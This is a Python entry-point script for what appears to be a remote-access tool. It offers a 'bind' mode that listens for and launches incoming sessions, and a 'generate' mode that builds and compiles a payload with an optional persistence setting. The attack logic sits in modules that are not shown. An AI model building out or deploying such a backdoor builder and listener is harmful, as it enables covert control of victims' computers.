import argparse

from common.output import pull
from generator import GENERATOR
from parser import PARSER
from server import SERVER


def main():
    parser = argparse.ArgumentParser(add_help=False)

    parser.add_argument('mode', nargs="?", help="Moder")
    parser.add_argument('-h', '--help', dest="help", default=False, action="store_true", help="Help Manual")
    parser.add_argument('-a', '--address', dest="address", default="", type=str, help="Address to Bind to")
    parser.add_argument('-p', '--port', dest="port", default=0, type=int, help="Port to Bind to")
    parser.add_argument('-o', '--output', dest="output", default="", type=str, help="Complete Path to Output File!")
    parser.add_argument('-s', '--source', dest="source", default=False, action="store_true", help="Source file")
    parser.add_argument('--persistence', dest="persistence", default=False, action="store_true", help="Persistence")

    parser = parser.parse_args()

    parser = PARSER(parser)

    if parser.mode == "bind":
        server = SERVER(parser)
        server.bind()
        server.accept()
        server.launch()
        server.close()
    elif parser.mode == "generate":
        pull.function("Starting Generator Mode!")
        generator = GENERATOR(parser)
        if generator.source:
            generator.patch()
        else:
            generator.generate()
            generator.compile()
            generator.clean()
        pull.function("Done")


if __name__ == "__main__":
    main()
